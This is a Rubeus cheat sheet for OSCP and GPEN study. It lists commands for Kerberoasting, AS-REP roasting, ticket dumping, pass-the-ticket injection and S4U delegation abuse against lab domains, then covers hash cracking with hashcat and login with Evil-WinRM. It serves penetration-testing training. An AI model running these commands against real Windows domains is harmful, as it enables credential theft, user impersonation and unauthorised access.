# Rubeus Cheat Sheet (OSCP / GPEN)

## Overview

**Rubeus** is a C# tool for interacting with Kerberos on Windows. It is commonly used for:

- Kerberoasting
- AS-REP Roasting
- Ticket extraction
- Ticket injection (Pass-the-Ticket)
- Ticket renewal
- Ticket monitoring
- S4U attacks
- Delegation attacks

Repository:

https://github.com/GhostPack/Rubeus

---

# Basic Syntax

```cmd
Rubeus.exe <command> [options]
```

---

# Kerberoasting

Request Service Tickets (TGS) for all SPN accounts.

```cmd
Rubeus.exe kerberoast
```

---

## Output Hashes for Hashcat

```cmd
Rubeus.exe kerberoast /format:hashcat
```

---

## Output Hashes for John

```cmd
Rubeus.exe kerberoast /format:john
```

---

## Roast Specific User

```cmd
Rubeus.exe kerberoast /user:sqlsvc
```

---

## Save Results

```cmd
Rubeus.exe kerberoast /outfile:hashes.txt
```

---

# AS-REP Roasting

Find users without Kerberos preauthentication.

```cmd
Rubeus.exe asreproast
```

---

## Roast Specific User

```cmd
Rubeus.exe asreproast /user:john
```

---

## Save Hashes

```cmd
Rubeus.exe asreproast /outfile:asrep.txt
```

---

# Request a TGT

Obtain a TGT using a plaintext password.

```cmd
Rubeus.exe asktgt /user:john /password:Password123! /domain:htb.local
```

---

## Using an NTLM Hash

```cmd
Rubeus.exe asktgt /user:john /rc4:<NTLM_HASH> /domain:htb.local
```

---

## AES256 Key

```cmd
Rubeus.exe asktgt /user:john /aes256:<AES_KEY> /domain:htb.local
```

---

## Inject the TGT

```cmd
Rubeus.exe asktgt \
    /user:john \
    /password:Password123! \
    /domain:htb.local \
    /ptt
```

---

# Pass-the-Ticket (PTT)

Inject an existing ticket.

```cmd
Rubeus.exe ptt /ticket:ticket.kirbi
```

---

# Dump Kerberos Tickets

Dump tickets from memory.

```cmd
Rubeus.exe dump
```

---

## Dump Only TGTs

```cmd
Rubeus.exe dump /service:krbtgt
```

---

# Monitor New Tickets

```cmd
Rubeus.exe monitor
```

---

# Triaging Tickets

Display cached tickets.

```cmd
Rubeus.exe triage
```

---

# Purge Tickets

Remove cached Kerberos tickets.

```cmd
Rubeus.exe purge
```

Equivalent to:

```cmd
klist purge
```

---

# Renew TGT

```cmd
Rubeus.exe renew
```

---

# Describe Ticket

```cmd
Rubeus.exe describe /ticket:ticket.kirbi
```

Useful during GPEN labs.

---

# Convert Base64 Ticket

```cmd
Rubeus.exe ptt /ticket:<BASE64_TICKET>
```

---

# S4U (Constrained Delegation)

Request a service ticket on behalf of another user.

```cmd
Rubeus.exe s4u \
    /user:websvc \
    /rc4:<HASH> \
    /impersonateuser:administrator \
    /msdsspn:cifs/server.htb.local \
    /ptt
```

Requires constrained delegation.

---

# Ticket Extraction

```cmd
Rubeus.exe dump
```

Save Base64 ticket.

Later:

```cmd
Rubeus.exe ptt /ticket:<BASE64>
```

---

# Common Parameters

| Parameter | Description |
|------------|-------------|
| `/user` | Username |
| `/password` | Plaintext password |
| `/rc4` | NTLM hash |
| `/aes256` | AES256 key |
| `/domain` | Domain |
| `/dc` | Domain Controller |
| `/outfile` | Save output |
| `/ptt` | Pass-the-Ticket |
| `/nowrap` | Disable line wrapping |
| `/service` | Target SPN |

---

# Typical OSCP Workflow

## Initial Credentials

```
john
Password123!
```

---

### Request TGT

```cmd
Rubeus.exe asktgt \
    /user:john \
    /password:Password123! \
    /domain:htb.local \
    /ptt
```

---

### Verify Ticket

```cmd
klist
```

---

### Kerberoast

```cmd
Rubeus.exe kerberoast
```

---

### Crack Hash

```bash
hashcat -m 13100 hashes.txt rockyou.txt
```

or

```bash
john hashes.txt
```

---

### Authenticate

```bash
evil-winrm \
-u sqlsvc \
-p Password123!
```

---

# Typical AD Attack Chain

```text
SMB
    ↓
LDAP
    ↓
Kerbrute
    ↓
Valid Users
    ↓
Password Spray
    ↓
Credentials
    ↓
Rubeus Kerberoast
    ↓
Crack Hash
    ↓
WinRM
    ↓
PowerView
    ↓
BloodHound
    ↓
Privilege Escalation
```

---

# Common Mistakes

## Wrong Domain

Incorrect:

```cmd
/domain:HTB
```

Correct:

```cmd
/domain:htb.local
```

---

## Forgetting /ptt

Without:

```cmd
/ptt
```

the ticket is obtained but not injected.

---

## Not Checking Cached Tickets

Always verify:

```cmd
klist
```

or

```cmd
Rubeus.exe triage
```

---

## Cracking the Wrong Hash Mode

Kerberoasting:

```
Hashcat Mode:
13100
```

AS-REP Roasting:

```
Hashcat Mode:
18200
```

---

# Useful Companion Tools

| Tool | Purpose |
|------|---------|
| PowerView | AD Enumeration |
| BloodHound | ACL Analysis |
| SharpHound | BloodHound Collection |
| Kerbrute | Username Enumeration |
| GetNPUsers.py | AS-REP Roasting |
| GetUserSPNs.py | Kerberoasting |
| Evil-WinRM | Shell Access |
| CrackMapExec / NetExec | Credential Validation |
| Mimikatz | Credential Extraction |

---

# OSCP Tips

- Kerberoast whenever SPNs exist.
- Check for AS-REP Roastable users.
- Always verify tickets with `klist`.
- Use `/ptt` to inject tickets immediately.
- Export hashes for offline cracking.
- Understand when to use Rubeus versus Impacket.

---

# GPEN Tips

Understand:

- Kerberos authentication flow.
- Difference between TGT and TGS.
- Kerberoasting process.
- AS-REP Roasting process.
- Pass-the-Ticket.
- Ticket cache.
- Ticket injection.
- Constrained delegation (S4U).
- Why RC4, AES128, and AES256 keys are accepted.
- When Windows requests Kerberos tickets automatically.

---

# Impacket vs Rubeus

| Task | Linux | Windows |
|------|---------|----------|
| Kerberoast | GetUserSPNs.py | Rubeus kerberoast |
| AS-REP Roast | GetNPUsers.py | Rubeus asreproast |
| Pass-the-Ticket | export KRB5CCNAME | Rubeus ptt |
| Request TGT | getTGT.py | Rubeus asktgt |
| Ticket Listing | klist | Rubeus triage |

---

# Quick Reference

```cmd
:: Kerberoast
Rubeus.exe kerberoast

:: Hashcat format
Rubeus.exe kerberoast /format:hashcat

:: Roast one user
Rubeus.exe kerberoast /user:sqlsvc

:: AS-REP Roast
Rubeus.exe asreproast

:: Request TGT
Rubeus.exe asktgt /user:user /password:Pass /domain:DOMAIN /ptt

:: Inject ticket
Rubeus.exe ptt /ticket:ticket.kirbi

:: Dump tickets
Rubeus.exe dump

:: List tickets
Rubeus.exe triage

:: Purge tickets
Rubeus.exe purge

:: Renew tickets
Rubeus.exe renew
```
